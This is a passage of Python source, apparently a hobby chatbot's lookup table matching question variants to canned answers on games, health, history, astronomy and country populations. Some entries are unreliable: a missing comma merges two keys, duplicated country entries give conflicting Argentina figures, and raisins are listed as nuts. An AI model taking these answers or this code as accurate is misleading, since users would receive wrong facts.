        }): "Mario is the main character in the Mario series, created by Nintendo. He is an Italian plumber known for his adventures in the Mushroom Kingdom.",

        frozenset({
            "who is link", 
            "link character", 
            "link from the legend of zelda", 
            "who is the link character", 
            "link in the game", 
            "who is the hero in zelda"
        }): "Link is the protagonist of The Legend of Zelda series, created by Nintendo. He is a courageous young hero often tasked with rescuing Princess Zelda and defeating the evil Ganon.",

        frozenset({
            "who is sonic", 
            "sonic the hedgehog", 
            "sonic character", 
            "who is the sonic character", 
            "sonic in video games", 
            "who is the fastest hedgehog"
        }): "Sonic is a blue anthropomorphic hedgehog and the main character in the Sonic the Hedgehog series, created by Sega. Known for his speed, he battles against Dr. Robotnik (Eggman).",

        frozenset({
            "who is kratos", 
            "kratos character", 
            "kratos from god of war", 
            "who is the god of war character", 
            "who is kratos in god of war", 
            "kratos god of war series"
        }): "Kratos is the main character in the God of War series, developed by Santa Monica Studio. He is a Spartan warrior who becomes the God of War and battles gods and mythological creatures.",

        frozenset({
            "who is master chief", 
            "master chief character", 
            "master chief in halo", 
            "who is the master chief character", 
            "master chief in video games", 
            "who is the protagonist in halo"
        }): "Master Chief, also known as John-117, is the protagonist of the Halo series, created by Bungie and later developed by 343 Industries. He is a super soldier fighting against alien forces in a futuristic universe.",

        frozenset({
            "who is samus aran", 
            "samus aran character", 
            "samus in metroid", 
            "who is the samus character", 
            "samus metroid series", 
            "who is the bounty hunter samus"
        }): "Samus Aran is the main character in the Metroid series, developed by Nintendo. She is a bounty hunter known for her power armor and space adventures, often fighting against space pirates and alien creatures.",

        frozenset({
            "who is geralt of rivia", 
            "geralt character", 
            "geralt of rivia witcher", 
            "who is the geralt character", 
            "geralt witcher series", 
            "who is the white wolf"
        }): "Geralt of Rivia is the main character of The Witcher series, created by Andrzej Sapkowski and popularized by CD Projekt Red. He is a monster hunter known as a Witcher, navigating a dark fantasy world filled with magic and moral dilemmas.",

        frozenset({
            "who is ryu", 
            "ryu character", 
            "ryu in street fighter", 
            "who is the ryu character", 
            "ryu in fighting games", 
            "who is the martial artist ryu"
        }): "Ryu is a central character in the Street Fighter series, developed by Capcom. He is a martial artist known for his determination to become the strongest fighter and his signature moves like the Hadouken.",

        frozenset({
            "who is the joker", 
            "joker character", 
            "joker from batman", 
            "who is the joker in batman", 
            "joker in video games", 
            "who is the villain joker"
        }): "The Joker is a fictional supervillain and one of Batman's most iconic enemies in DC Comics. Known for his chaotic nature and dark humor, he often challenges Batman's morals and creates havoc in Gotham City.",
        
        frozenset({
        "what is a healthy body weight",
        "how do I know if my weight is healthy",
        "what is considered a healthy weight",
        "define healthy weight",
        "what is the ideal weight for me",
        "what is a healthy body weight?",
        "how do i know if my weight is healthy?",
        "what is considered a healthy weight?",
        "define healthy weight?",
        "what is the ideal weight for me?"
        }): "A healthy body weight is typically determined by your BMI, but it also takes into account factors like muscle mass and overall health. BMI ranges from 18.5 to 24.9 are generally considered normal",

        frozenset({
            "how many calories should I eat in a day",
            "how many calories do I need per day",
            "what is the daily calorie requirement",
            "how many calories should I consume in a day",
            "how many calories should i eat in a day?",
            "how many calories do i need per day?",
            "what is the daily calorie requirement?",
            "how many calories should i consume in a day?"
        }): "The number of calories you need depends on age, gender, activity level, and overall health. On average, an adult woman needs about 1,800–2,400 calories, and an adult man needs about 2,200–3,000 calories",

        frozenset({
            "what is the ideal body fat percentage",
            "what is a good body fat percentage",
            "ideal body fat percentage for men and women",
            "how much body fat is considered healthy",
            "what is the ideal body fat percentage?",
            "what is a good body fat percentage?",
            "ideal body fat percentage for men and women?",
            "how much body fat is considered healthy?"
        }): "The ideal body fat percentage varies by age and gender. For men, a healthy range is typically 6-24%, and for women, it's 14-31%. Athletes often fall at the lower end of the scale.",

        frozenset({
            "how to calculate my heart rate",
            "how do I check my heart rate",
            "what is a normal heart rate",
            "how can I measure my pulse",
            "how to calculate my heart rate?",
            "how do I check my heart rate?",
            "what is a normal heart rate?",
            "how can I measure my pulse?"
        }): "To calculate your heart rate, count the number of beats for 15 seconds and multiply by 4. A normal resting heart rate for adults is between 60-100 beats per minute.",

        frozenset({
            "what is blood pressure",
            "define blood pressure",
            "what is normal blood pressure",
            "how is blood pressure measured",
            "what is blood pressure?",
            "define blood pressure?",
            "what is normal blood pressure?",
            "how is blood pressure measured?"
        }): "Blood pressure is the force of blood against the walls of your arteries. It's measured in two numbers: systolic (when the heart beats) over diastolic (when the heart is at rest). Normal blood pressure is typically around 120/80 mmHg.",

        frozenset({
            "what is a recipe",
            "define recipe",
            "what is the definition of recipe",
            "what is a recipe?",
            "define recipe?",
            "what is the definition of recipe?"
        }): "A recipe is a set of instructions for preparing a particular dish, including a list of the ingredients required and the steps to follow.",

        frozenset({
            "what is a noun",
            "define noun",
            "what is noun",
            "what is a noun in grammar",
            "what is a noun?",
            "define noun?",
            "what is noun?",
            "what is a noun in grammar?"
        }): "A noun is a part of speech that represents a person, place, thing, or idea.",

        frozenset({
            "what is finance",
            "define finance",
            "what is financial management",
            "what does finance mean",
            "what is finance?",
            "define finance?",
            "what is financial management?",
            "what does finance mean?"
        }): "Finance is the management of money, including activities like investing, borrowing, lending, budgeting, saving, and forecasting.",

        frozenset({
            "what is economics",
            "define economics",
            "what does economics study",
            "what is the study of economics",
            "what is economics?",
            "define economics?",
            "what does economics study?",
            "what is the study of economics?"
        }): "Economics is the study of how people allocate resources and make choices to satisfy their needs and wants in a world with limited resources.",
        
        frozenset({
            "who was the first president of the united states",
            "who was the first president of usa",
            "who was the first president of america",
            "who was the first president of the united states?",
            "who was the first president of usa?",
            "who was the first president of america?"
        }): "george washington was the first president of the united states, serving from 1789 to 1797",

        frozenset({
            "who was cleopatra",
            "define cleopatra",
            "who is cleopatra",
            "who was cleopatra?",
            "define cleopatra?",
            "who is cleopatra?"
        }): "cleopatra vii was the last active ruler of the ptolemaic kingdom of egypt, known for her intelligence and romantic relationships with julius caesar and mark antony",

        frozenset({
            "when was world war 1",
            "when did world war 1 start",
            "when was world war 1 fought",
            "when was world war 1?",
            "when did world war 1 start?",
            "when was world war 1 fought?"
        }): "world war 1 began on july 28, 1914, and ended on november 11, 1918",

        frozenset({
            "when was world war 2",
            "when did world war 2 start",
            "when was world war 2 fought",
            "when was world war 2?",
            "when did world war 2 start?",
            "when was world war 2 fought?"
        }): "world war 2 began on september 1, 1939, and ended on september 2, 1945",

        frozenset({
            "who was napoleon bonaparte",
            "define napoleon bonaparte",
            "who is napoleon bonaparte",
            "who was napoleon bonaparte?",
            "define napoleon bonaparte?",
            "who is napoleon bonaparte?"
        }): "napoleon bonaparte was a french military leader who rose to prominence during the french revolution and became the emperor of france from 1804 to 1814",

        frozenset({
            "what was the cold war",
            "define cold war",
            "what is the cold war",
            "what was the cold war?",
            "define cold war?",
            "what is the cold war?"
        }): "the cold war was a period of political and military tension between the united states and the soviet union from 1947 to 1991, without direct warfare between the two superpowers",

        frozenset({
            "who discovered america",
            "who was the first to discover america",
            "who found america",
            "who discovered america?",
            "who was the first to discover america?",
            "who found america?"
        }): "christopher columbus is often credited with discovering america in 1492, although indigenous peoples had been living there long before his arrival",

        frozenset({
            "when was the roman empire",
            "when did the roman empire exist",
            "when did the roman empire fall",
            "when was the roman empire?",
            "when did the roman empire exist?",
            "when did the roman empire fall?"
        }): "the roman empire existed from 27 bc to 476 ad, with its fall marking the end of ancient rome and the beginning of the middle ages in europe",

        frozenset({
            "who was julius caesar",
            "define julius caesar",
            "who is julius caesar",
            "who was julius caesar?",
            "define julius caesar?",
            "who is julius caesar?"
        }): "julius caesar was a roman general and dictator who played a critical role in the events that led to the demise of the roman republic and the rise of the roman empire",

        frozenset({
            "who was mahatma gandhi",
            "define mahatma gandhi",
            "who is mahatma gandhi",
            "who was mahatma gandhi?",
            "define mahatma gandhi?",
            "who is mahatma gandhi?"
        }): "mahatma gandhi was an indian freedom fighter and leader who advocated for non-violent resistance and played a key role in india's independence from british rule",

        frozenset({
            "what was the french revolution",
            "define french revolution",
            "what caused the french revolution",
            "what was the french revolution?",
            "define french revolution?",
            "what caused the french revolution?"
        }): "the french revolution was a period of social and political upheaval in france from 1789 to 1799, leading to the overthrow of the monarchy and the establishment of a republic",

        frozenset({
            "who was the first emperor of china",
            "define first emperor of china",
            "who was qin shi huang",
            "who was the first emperor of china?",
            "define first emperor of china?",
            "who was qin shi huang?"
        }): "qin shi huang was the first emperor of china, uniting the country in 221 bc and initiating the construction of the great wall of china and the terracotta army",

        frozenset({
            "when was the industrial revolution",
            "when did the industrial revolution start",
            "what caused the industrial revolution",
            "when was the industrial revolution?",
            "when did the industrial revolution start?",
            "what caused the industrial revolution?"
        }): "the industrial revolution began in the late 18th century, around the 1760s, and continued into the 19th century, marking the transition from agrarian economies to industrialized ones",

        frozenset({
            "who was adolf hitler",
            "define adolf hitler",
            "who was hitler",
            "who was adolf hitler?",
            "define adolf hitler?",
            "who was hitler?"
        }): "adolf hitler was the dictator of nazi germany from 1933 to 1945 and was a key figure in the events leading to world war ii and the holocaust",

        frozenset({
            "what was the civil rights movement",
            "define civil rights movement",
            "what is the civil rights movement",
            "what was the civil rights movement?",
            "define civil rights movement?",
            "what is the civil rights movement?"
        }): "the civil rights movement was a struggle for social justice in the 1950s and 1960s in the united states aimed at ending racial discrimination and promoting equal rights for african americans",

        frozenset({
            "who was albert einstein",
            "define albert einstein",
            "who is albert einstein",
            "who was albert einstein?",
            "define albert einstein?",
            "who is albert einstein?"
        }): "albert einstein was a theoretical physicist best known for developing the theory of relativity, which revolutionized our understanding of space, time, and gravity",

        frozenset({
            "who was winston churchill",
            "define winston churchill",
            "who is winston churchill",
            "who was winston churchill?",
            "define winston churchill?",
            "who is winston churchill?"
        }): "winston churchill was the prime minister of the united kingdom during world war ii, known for his leadership and speeches that rallied the british people during difficult times",

        frozenset({
            "what is space",
            "define space",
            "what is outer space",
            "explain space"
        }): "Space, also known as outer space, is the vast expanse beyond Earth's atmosphere. It is largely empty, containing little matter but filled with stars, planets, moons, asteroids, comets, and other celestial bodies.",

        frozenset({
            "what is a black hole",
            "define black hole",
            "explain black hole",
            "what is a black hole's function"
        }): "A black hole is a region in space where gravity is so strong that not even light can escape from it. It forms when a massive star collapses under its own gravity at the end of its life cycle.",

        frozenset({
            "what is the universe",
            "define universe",
            "explain universe",
            "what is the size of the universe"
        }): "The universe refers to everything that exists, including galaxies, stars, planets, space, time, and matter. It is constantly expanding, with no known edge, and contains all observable phenomena in existence.",

        frozenset({
            "what is the solar system",
            "define solar system",
            "how many planets are in the solar system",
            "explain the solar system"
        }): "The solar system consists of the Sun and the celestial bodies that are gravitationally bound to it, including eight planets, their moons, dwarf planets, comets, and asteroids.",

        frozenset({
            "what is a star",
            "define star",
            "how do stars form",
            "what is the life cycle of a star"
        }): "A star is a massive, luminous ball of gas, primarily hydrogen and helium, that undergoes nuclear fusion to produce light and heat. Stars are born in nebulae and go through stages such as main sequence, red giant, and possibly supernova, depending on their size.",

        frozenset({
            "what is the Big Bang theory",
            "define Big Bang theory",
            "explain the Big Bang theory",
            "what happened during the Big Bang"
        }): "The Big Bang theory suggests that the universe began as a singular, extremely hot and dense point around 13.8 billion years ago and has been expanding ever since. It marks the origin of time, space, and matter.",

        frozenset({
            "what are galaxies",
            "define galaxies",
            "how many galaxies are in the universe",
            "explain galaxies"
        }): "A galaxy is a massive system of stars, stellar remnants, interstellar gas, dust, and dark matter bound together by gravity. Our galaxy, the Milky Way, is just one of the billions of galaxies in the universe.",

        frozenset({
            "what is light year",
            "define light year",
            "how far is a light year",
            "explain light year"
        }): "A light year is the distance that light travels in one year, roughly 9.46 trillion kilometers or 5.88 trillion miles. It is commonly used to measure astronomical distances, such as the distance between stars and galaxies.",

        frozenset({
            "what was the berlin wall",
            "define berlin wall",
            "why was the berlin wall built",
            "what was the berlin wall?",
            "define berlin wall?",
            "why was the berlin wall built?"
        }): "the berlin wall was a barrier constructed in 1961 by east germany to separate east and west berlin, symbolizing the division of the cold war and the iron curtain",

        frozenset({
            "what was the renaissance",
            "define renaissance",
            "what caused the renaissance",
            "what was the renaissance?",
            "define renaissance?",
            "what caused the renaissance?"
        }): "the renaissance was a cultural, artistic, and intellectual movement that began in italy in the 14th century, marking the transition from the medieval to the modern age",

        frozenset({
            "who was queen elizabeth i",
            "define queen elizabeth i",
            "who is queen elizabeth i",
            "who was queen elizabeth i?",
            "define queen elizabeth i?",
            "who is queen elizabeth i?"
        }): "queen elizabeth i was the queen of england from 1558 to 1603, known for her leadership during the elizabethan era, including the defeat of the spanish armada in 1588",

        frozenset({
            "who was the first man on the moon",
            "who was the first person to land on the moon",
            "who was neil armstrong",
            "who was the first man on the moon?",
            "who was the first person to land on the moon?",
            "who was neil armstrong?"
        }): "neil armstrong was the first person to walk on the moon on july 20, 1969, during nasa's apollo 11 mission",

        frozenset({
            "who was socrates",
            "define socrates",
            "who is socrates",
            "who was socrates?",
            "define socrates?",
            "who is socrates?"
        }): "socrates was an ancient greek philosopher who is credited with laying the foundations for western philosophy, known for his method of questioning and dialogue",

        frozenset({
            "who was genghis khan",
            "define genghis khan",
            "who is genghis khan",
            "who was genghis khan?",
            "define genghis khan?",
            "who is genghis khan?"
        }): "genghis khan was the founder of the mongol empire, which became the largest contiguous empire in history after his death in 1227",

        frozenset({
            "what was the great depression",
            "define great depression",
            "what caused the great depression",
            "what was the great depression?",
            "define great depression?",
            "what caused the great depression?"
        }): "the great depression was a severe worldwide economic downturn that started in 1929 and lasted throughout the 1930s, triggered by the stock market crash in the united states",

        frozenset({
            "who was martin luther king jr.",
            "define martin luther king jr.",
            "who is martin luther king jr.",
            "who was martin luther king jr.?",
            "define martin luther king jr.?",
            "who is martin luther king jr.?"
        }): "martin luther king jr. was an american baptist minister and activist who became the most visible spokesperson and leader in the civil rights movement, known for his advocacy of nonviolent protest",

        frozenset({
            "what is inflation",
            "define inflation",
            "what does inflation mean",
            "what is inflation?",
            "define inflation?",
            "what does inflation mean?"
        }): "Inflation is the rate at which the general level of prices for goods and services rises, leading to a decrease in purchasing power.",

        frozenset({
            "what is deflation",
            "define deflation",
            "what does deflation mean",
            "what is deflation?",
            "define deflation?",
            "what does deflation mean?"
        }): "Deflation is the reduction in the general price level of goods and services, typically caused by a decrease in the supply of money or credit.",

        frozenset({
            "name the process by which plants prepare food",
            "name the process by which plants prepare food?",
            "what is the process by which plants make food",
            "how do plants prepare food",
            "process plants use to make food"
        }): "Photosynthesis",

        frozenset({
            "which animal is known as the king of the jungle",
            "which animal is known as the king of the jungle?",
            "name the king of the jungle",
            "what animal is called the king of the jungle",
            "king of the jungle animal"
        }): "Lion",

        frozenset({
            "which is the national animal of india",
            "which is the national animal of india?",
            "name the national animal of india",
            "what is the national animal of india",
            "india's national animal"
        }): "Tiger",

        frozenset({
            "a group of stars is called",
            "a group of stars is called?",
            "name a group of stars",
            "what is a group of stars called",
            "group of stars"
        }): "Constellation",

        frozenset({
            "where is the tropic of cancer located",
            "where is the tropic of cancer located?",
            "location of the tropic of cancer",
            "name the location of tropic of cancer",
            "tropic of cancer position"
        }): "23 ½° N of equator",

        frozenset({
            "what are the two motions of the earth",
            "what are the two motions of the earth?",
            "name the two motions of earth",
            "two motions of the earth",
            "earth's two motions"
        }): "Rotation and revolution",

        frozenset({
            "india shares its boundaries with how many countries",
            "india shares its boundaries with how many countries?",
            "how many countries share borders with india",
            "number of countries sharing india's borders",
            "how many countries have borders with india"
        }): "Seven",

        frozenset({
            "which islands are located in the arabian sea",
            "which islands are located in the arabian sea?",
            "name the islands in the arabian sea",
            "islands in the arabian sea",
            "islands located in the arabian sea"
        }): "Lakshadweep",

        frozenset({
            "lemons and oranges are rich in which vitamin",
            "lemons and oranges are rich in which vitamin?",
            "which vitamin is found in lemons and oranges",
            "what vitamin is found in lemons and oranges",
            "which vitamin do lemons and oranges contain"
        }): "Vitamin C",

        frozenset({
            "name a few foods that are unhealthy for you",
            "name a few foods that are unhealthy for you?",
            "unhealthy foods to avoid",
            "foods that are not healthy",
            "what foods are unhealthy for you"
        }): "Sugar, cakes, soft drinks, pizza, chips",

        frozenset({
            "which drink is prepared from crushing grapes",
            "which drink is prepared from crushing grapes?",
            "name the drink made from crushing grapes",
            "what drink is made from crushing grapes",
            "grape drink"
        }): "Wine",

        frozenset({
            "some nuts that are healthy",
            "some nuts that are healthy?",
            "healthy nuts to eat",
            "which nuts are healthy",
            "name some healthy nuts"
        }): "Almonds, raisins, cashews, pistachios, hazelnuts",

        frozenset({
                "What is the capital city of Canada?",
                "Capital city of Canada?",
                "Where is the capital of Canada?",
                "Which city is the capital of Canada?"
            }): "Ottawa",

        frozenset({
            "Who wrote the play 'Romeo and Juliet'?",
            "Author of Romeo and Juliet?",
            "Who is the writer of 'Romeo and Juliet'?",
            "Who wrote the famous play 'Romeo and Juliet'?"
        }): "William Shakespeare",

        frozenset({
            "Which element has the chemical symbol 'O'?",
            "What element has symbol 'O'?",
            "Name the element with the symbol 'O'",
            "Which chemical element is symbolized by 'O'?"
        }): "Oxygen",

        frozenset({
            "In which year did the Titanic sink?",
            "Titanic sinking year?",
            "When did the Titanic sink?",
            "Year of Titanic sinking?"
        }): "1912",

        frozenset({
            "Who painted the Mona Lisa?",
            "Artist of the Mona Lisa?",
            "Who is the artist behind the Mona Lisa?",
            "Which artist painted Mona Lisa?"
        }): "Leonardo da Vinci",

        frozenset({
            "What is the largest planet in our solar system?",
            "Largest planet in the solar system?",
            "Which planet is the largest in our solar system?",
            "What planet is the largest in the solar system?"
        }): "Jupiter",

        frozenset({
            "Which country is known as the Land of the Rising Sun?",
            "Land of the Rising Sun?",
            "Which country is called the Land of the Rising Sun?",
            "Which nation is the Land of the Rising Sun?"
        }): "Japan",

        frozenset({
            "What is the longest river in the world?",
            "Longest river in the world?",
            "Which river is the longest in the world?",
            "Name the longest river in the world."
        }): "Nile River",

        frozenset({
            "Who was the first President of the United States?",
            "First President of the United States?",
            "Who was the first U.S. President?",
            "Name the first President of the United States."
        }): "George Washington",

        frozenset({
            "What is the hardest natural substance on Earth?",
            "Hardest natural material on Earth?",
            "Which is the hardest natural substance?",
            "Which material is the hardest natural substance on Earth?"
        }): "Diamond",

        frozenset({
            "Which element has the chemical symbol 'Na'?",
            "What element has symbol 'Na'?",
            "Name the element with the symbol 'Na'",
            "Which element is symbolized by 'Na'?"
        }): "Sodium",

        frozenset({
            "Who developed the theory of general relativity?",
            "Who formulated the theory of general relativity?",
            "Which scientist developed the general theory of relativity?",
            "Who created the general theory of relativity?"
        }): "Albert Einstein",

        frozenset({
            "What is the largest desert in the world?",
            "Largest desert in the world?",
            "Which desert is the largest in the world?",
            "Name the largest desert in the world."
        }): "Sahara Desert",

        frozenset({
            "Which planet is known as the Red Planet?",
            "Red Planet?",
            "What planet is known as the Red Planet?",
            "Which planet is called the Red Planet?"
        }): "Mars",

        frozenset({
            "what is the difference between a province and a state?",
            "how is a province different from a state?",
            "difference between province and state",
            "difference between state and province",
            "what distinguishes a province from a state?",
            "what makes a province different from a state?",
            "can you explain the difference between province and state?",
            "how do provinces and states differ?",
            "what are the differences between province and state?",
            "what is the distinction between a province and a state?",
            "difference between a province and a state",
            "pistinction between province and state",
            "province and state differences",
            "explain the difference between province and state"
        }): "The main difference between a province and a state lies in the governance structure. A province is typically a region within a country governed by a central authority, while a state often has its own government and autonomy. States can have more power in decision-making than provinces, depending on the country's system of governance.",

        frozenset({
            "who was the first woman to win a nobel prize?",
            "first woman nobel prize winner?",
            "first woman nobel price winner"
            "who won the first nobel prize as a woman?",
            "which woman first won the nobel prize?"
        }): "marie Curie",

        frozenset({
            "what is the population of afghanistan", 
            "afghanistan population", 
            "population afghanistan",
            "afghanistan population numbers", 
            "how many people live in afghanistan", 
            "afghanistan inhabitants"
        }): "Approximately 40.2 million (2021, World Bank estimate).",

        frozenset({
                "what is the population of india", 
                "india population", 
                "population india", 
                "india population numbers", 
                "how many people live in india", 
                "india inhabitants"
            }): "Approximately 1.42 billion (2023, World Bank estimate).",
            
            frozenset({
                "what is the population of china", 
                "china population", 
                "population china", 
                "china population numbers", 
                "how many people live in china", 
                "china inhabitants"
            }): "Approximately 1.41 billion (2023, World Bank estimate).",
            
            frozenset({
                "what is the population of russia", 
                "russia population", 
                "population russia", 
                "russia population numbers", 
                "how many people live in russia", 
                "russia inhabitants"
            }): "Approximately 146.7 million (2023, World Bank estimate).",
            
            frozenset({
                "what is the population of germany", 
                "germany population", 
                "population germany", 
                "germany population numbers", 
                "how many people live in germany", 
                "germany inhabitants"
            }): "Approximately 83.3 million (2023, World Bank estimate).",
            
            frozenset({
                "what is the population of south africa", 
                "south africa population", 
                "population south africa", 
                "south africa population numbers", 
                "how many people live in south africa", 
                "south africa inhabitants"
            }): "Approximately 61.3 million (2023, World Bank estimate).",
            
            frozenset({
                "what is the population of nigeria", 
                "nigeria population", 
                "population nigeria", 
                "nigeria population numbers", 
                "how many people live in nigeria", 
                "nigeria inhabitants"
            }): "Approximately 226.7 million (2023, World Bank estimate).",
            
            frozenset({
                "what is the population of mexico", 
                "mexico population", 
                "population mexico", 
                "mexico population numbers", 
                "how many people live in mexico", 
                "mexico inhabitants"
            }): "Approximately 127.6 million (2023, World Bank estimate).",

            frozenset({
                "what is the population of india", 
                "india population", 
                "population india", 
                "india population numbers", 
                "how many people live in india", 
                "india inhabitants"
            }): "Approximately 1.42 billion (2023, World Bank estimate).",
            
            frozenset({
                "what is the population of china", 
                "china population", 
                "population china", 
                "china population numbers", 
                "how many people live in china", 
                "china inhabitants"
            }): "Approximately 1.41 billion (2023, World Bank estimate).",
            
            frozenset({
                "what is AI ethics",
                "whatis ai ethics",
                "define ai ethics",
                "explain ai ethics",
                "define AI ethics",
                "how does AI ethics work",
                "explain AI ethics"
            }): "AI ethics involves the study and application of ethical principles in AI development and deployment, ensuring fairness, transparency, accountability, and preventing harmful biases.",

            frozenset({
                "what is the population of russia", 
                "russia population", 
                "population russia", 
                "russia population numbers", 
                "how many people live in russia", 
                "russia inhabitants"
            }): "Approximately 146.7 million (2023, World Bank estimate).",
            
            frozenset({
                "what is the population of germany", 
                "germany population", 
                "population germany", 
                "germany population numbers", 
                "how many people live in germany", 
                "germany inhabitants"
            }): "Approximately 83.3 million (2023, World Bank estimate).",
            
            frozenset({
                "what is the population of south africa", 
                "south africa population", 
                "population south africa", 
                "south africa population numbers", 
                "how many people live in south africa", 
                "south africa inhabitants"
            }): "Approximately 61.3 million (2023, World Bank estimate).",
            
            frozenset({
                "what is the population of nigeria", 
                "nigeria population", 
                "population nigeria", 
                "nigeria population numbers", 
                "how many people live in nigeria", 
                "nigeria inhabitants"
            }): "Approximately 226.7 million (2023, World Bank estimate).",
            
            frozenset({
                "what is the population of mexico", 
                "mexico population", 
                "population mexico", 
                "mexico population numbers", 
                "how many people live in mexico", 
                "mexico inhabitants"
            }): "Approximately 127.6 million (2023, World Bank estimate).",

            frozenset({
                "what is the population of south korea", 
                "south korea population", 
                "population south korea", 
                "south korea population numbers", 
                "how many people live in south korea", 
                "south korea inhabitants"
            }): "Approximately 51.8 million (2023, World Bank estimate).",

            frozenset({
                "what is the population of north korea", 
                "north korea population", 
                "population north korea", 
                "north korea population numbers", 
                "how many people live in north korea", 
                "north korea inhabitants"
            }): "Approximately 26.4 million (2023, World Bank estimate).",

            frozenset({
                "what is the population of sri lanka", 
                "sri lanka population", 
                "population sri lanka", 
                "sri lanka population numbers", 
                "how many people live in sri lanka", 
                "sri lanka inhabitants"
            }): "Approximately 22.5 million (2023, World Bank estimate).",

            frozenset({
                "what is the population of nepal", 
                "nepal population", 
                "population nepal", 
                "nepal population numbers", 
                "how many people live in nepal", 
                "nepal inhabitants"
            }): "Approximately 32.7 million (2023, World Bank estimate).",

            frozenset({
                "what is the population of uk", 
                "uk population", 
                "population uk", 
                "uk population numbers", 
                "how many people live in uk", 
                "uk inhabitants"
            }): "Approximately 67.4 million (2023, World Bank estimate).",

            frozenset({
                "what is the population of argentina", 
                "argentina population", 
                "population argentina", 
                "argentina population numbers", 
                "how many people live in argentina", 
                "argentina inhabitants"
            }): "Approximately 46.8 million (2023, World Bank estimate).",

            frozenset({
                "what is the population of brazil", 
                "brazil population", 
                "population brazil", 
                "brazil population numbers", 
                "how many people live in brazil", 
                "brazil inhabitants"
            }): "Approximately 216.3 million (2023, World Bank estimate).",

            frozenset({
                "what is the population of spain", 
                "spain population", 
                "population spain", 
                "spain population numbers", 
                "how many people live in spain", 
                "spain inhabitants"
            }): "Approximately 47.6 million (2023, World Bank estimate).",

            frozenset({
                "what is the population of ukraine", 
                "ukraine population", 
                "population ukraine", 
                "ukraine population numbers", 
                "how many people live in ukraine", 
                "ukraine inhabitants"
            }): "Approximately 37.7 million (2023, World Bank estimate).",

            frozenset({
                "what is the population of myanmar", 
                "myanmar population", 
                "population myanmar", 
                "myanmar population numbers", 
                "how many people live in myanmar", 
                "myanmar inhabitants"
            }): "Approximately 56.8 million (2023, World Bank estimate).",

            frozenset({
                "what is the population of bhutan", 
                "bhutan population", 
                "population bhutan", 
                "bhutan population numbers", 
                "how many people live in bhutan", 
                "bhutan inhabitants"
            }): "Approximately 864,000 (2023, World Bank estimate).",

            frozenset({
                "what is the population of mongolia", 
                "mongolia population", 
                "population mongolia", 
                "mongolia population numbers", 
                "how many people live in mongolia", 
                "mongolia inhabitants"
            }): "Approximately 3.6 million (2023, World Bank estimate).",

            frozenset({
                "what is the population of new zealand", 
                "new zealand population", 
                "population new zealand", 
                "new zealand population numbers", 
                "how many people live in new zealand", 
                "new zealand inhabitants"
            }): "Approximately 5.1 million (2023, World Bank estimate).",

            frozenset({
                "what is the population of albania", 
                "albania population", 
                "population albania",
                "albania population numbers", 
                "how many people live in albania", 
                "albania inhabitants"
            }): "Approximately 2.8 million (2021, World Bank estimate).",

            frozenset({
                "what is the population of algeria", 
                "algeria population", 
                "population algeria",
                "algeria population numbers", 
                "how many people live in algeria", 
                "algeria inhabitants"
            }): "Approximately 44.9 million (2021, World Bank estimate).",

            frozenset({
                "what is the population of andorra", 
                "andorra population", 
                "population andorra",
                "andorra population numbers", 
                "how many people live in andorra", 
                "andorra inhabitants"
            }): "Approximately 77,000 (2021, World Bank estimate).",

            frozenset({
                "what is the population of angola", 
                "angola population", 
                "population angola",
                "angola population numbers", 
                "how many people live in angola", 
                "angola inhabitants"
            }): "Approximately 32.8 million (2021, World Bank estimate).",

            frozenset({
                "what is the population of antigua and barbuda", 
                "antigua and barbuda population", 
                "population antigua and barbuda",
                "antigua and barbuda population numbers", 
                "how many people live in antigua and barbuda", 
                "antigua and barbuda inhabitants"
            }): "Approximately 93,000 (2021, World Bank estimate).",

            frozenset({
                "what is the population of argentina", 
                "argentina population", 
                "population argentina",
                "argentina population numbers", 
                "how many people live in argentina", 
                "argentina inhabitants"
            }): "Approximately 45.8 million (2021, World Bank estimate).",

            frozenset({
                "what is the population of armenia", 
                "armenia population", 
                "population armenia",
                "armenia population numbers", 
                "how many people live in armenia", 
                "armenia inhabitants"
            }): "Approximately 3 million (2021, World Bank estimate).",

            frozenset({
                "what is the population of australia", 
                "australia population", 
                "population australia",
                "australia population numbers", 
                "how many people live in australia", 
                "australia inhabitants"
            }): "Approximately 25.7 million (2021, World Bank estimate).",

            frozenset({
                "what is the population of austria", 
                "austria population", 
                "population austria",
                "austria population numbers", 
                "how many people live in austria", 
                "austria inhabitants"
            }): "Approximately 9 million (2021, World Bank estimate).",

            frozenset({
                "what is the population of azerbaijan", 
                "azerbaijan population", 
                "population azerbaijan",
                "azerbaijan population numbers", 
                "how many people live in azerbaijan", 
                "azerbaijan inhabitants"
            }): "Approximately 10.1 million (2021, World Bank estimate).",
            # ... Add more countries following this pattern
                frozenset({
                "what is the population of japan", 
                "japan population", 
                "population japan",
                "japan population numbers", 
                "how many people live in japan", 
                "japan inhabitants"
            }): "Approximately 125.7 million (2021, World Bank estimate).",

        frozenset({
            "what is it",
            "what is IT",
            "what is iT",
            "what is it?",
            "what is IT?",
            "what is iT",
            "define it",
            "define iT",
            "define IT",
            "explain it",
            "explain iT",
            "explain IT"
        }): "IT stands for Information Technology. It refers to the use of computers, networks, and software to store, retrieve, transmit, and manage data. It's commonly used in businesses and organizations to handle technical systems and processes.",

        frozenset({
            "What is the capital city of Australia?",
            "Capital city of Australia?",
            "Where is the capital of Australia?",
            "Which city is the capital of Australia?"
        }): "Canberra",

        frozenset({
            "what is gpt",
            "explain gpt",
            "what is gpt?"
        }): """
GPT models are a key part of generative AI, allowing machines to produce content that's creative and human-quality. They can:
Create human-like text
Create content like images and music
Answer questions in a conversational way
Write code
Process data
""",
        frozenset({
            "Which ocean is the largest?",
            "Largest ocean in the world?",
            "What is the largest ocean?",
            "Name the largest ocean."
        }): "Pacific Ocean",

        frozenset({
            "Who wrote the novel '1984'?",
            "Author of '1984'?",
            "Who is the writer of '1984'?",
            "Which author wrote '1984'?"
        }): "George Orwell",

        frozenset({
            "What is the smallest country in the world?",
            "Smallest country?",
            "Which is the smallest country in the world?",
            "Name the smallest country in the world."
        }): "Vatican City",

        frozenset({
            "what is service sector",
            "explain service sector",
            "define service sector",
            "what is service sector?"
        }): "The service sector includes industries that provide services rather than goods. Examples: Healthcare, education, banking, tourism, IT services, and retail. It focuses on activities like customer support, entertainment, and business services.",

        frozenset({
            "Which element has the chemical symbol 'Fe'?",
            "What element has symbol 'Fe'?",
            "Name the element with the symbol 'Fe'",
            "Which element is symbolized by 'Fe'?"
        }): "Iron",

        frozenset({
            "which vegetables are grown underground",
            "which vegetables are grown underground?",
            "name vegetables grown underground",
            "underground vegetables",
            "which vegetables grow underground"
        }): "Potato, radish, onion, garlic, ginger, carrot",
#***************
        frozenset({
            "what digital currency was created by satoshi nakamoto",
            "what digital currency satoshi nakamoto invented",
